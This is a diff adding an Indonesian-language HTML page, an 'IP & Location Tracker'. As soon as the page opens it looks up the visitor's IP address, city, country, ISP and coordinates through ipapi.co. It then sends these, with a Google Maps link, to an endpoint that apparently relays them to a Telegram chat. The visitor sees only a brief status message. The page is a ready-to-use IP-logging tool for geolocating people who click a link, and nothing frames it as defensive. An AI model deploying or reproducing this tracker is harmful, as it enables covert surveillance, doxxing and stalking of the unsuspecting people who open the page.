@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Pelacak IP & Lokasi</title>
+  <meta charset="UTF-8" />
+</head>
+<body>
+  <h2>Memproses pelacakan lokasi...</h2>
+  <p id="status">Mohon tunggu...</p>
+
+  <script>
+    async function sendTelegramMessage(text) {
+      try {
+        const res = await fetch('/api/telegram', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message: text })
+        });
+
+        const data = await res.json();
+
+        if (!data.ok) {
+          console.error('Gagal kirim ke Telegram:', data);
+          document.getElementById('status').innerText = 'Gagal kirim ke Telegram: ' + data.error;
+        } else {
+          document.getElementById('status').innerText = 'Lokasi berhasil dikirim!';
+        }
+      } catch (e) {
+        console.error('Error kirim:', e);
+        document.getElementById('status').innerText = 'Terjadi error saat kirim pesan.';
+      }
+    }
+
+    async function trackLocation() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+
+        const ip = data.ip || 'N/A';
+        const city = data.city || 'N/A';
+        const region = data.region || 'N/A';
+        const country = data.country_name || 'N/A';
+        const org = data.org || 'N/A';
+        const timezone = data.timezone || 'N/A';
+        const lat = data.latitude || 'N/A';
+        const lon = data.longitude || 'N/A';
+        const timeNow = new Date().toLocaleString();
+
+        const message = 
+`🌍 *Pengunjung Baru!*
+
+📡 IP: \`${ip}\`
+🏙️ Kota: ${city}
+🗺️ Wilayah: ${region}
+🌐 Negara: ${country}
+📍 Koordinat: ${lat}, ${lon}
+🏢 ISP/Org: ${org}
+🕒 Waktu Akses: ${timeNow}
+⏱ Zona Waktu: ${timezone}
+🗺️ [Lihat di Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
+
+        await sendTelegramMessage(message);
+
+      } catch (e) {
+        console.error('Error ambil lokasi:', e);
+        document.getElementById('status').innerText = 'Gagal mengambil lokasi.';
+      }
+    }
+
+    // Jalankan saat halaman dibuka
+    trackLocation();
+  </script>
+</body>
+</html>
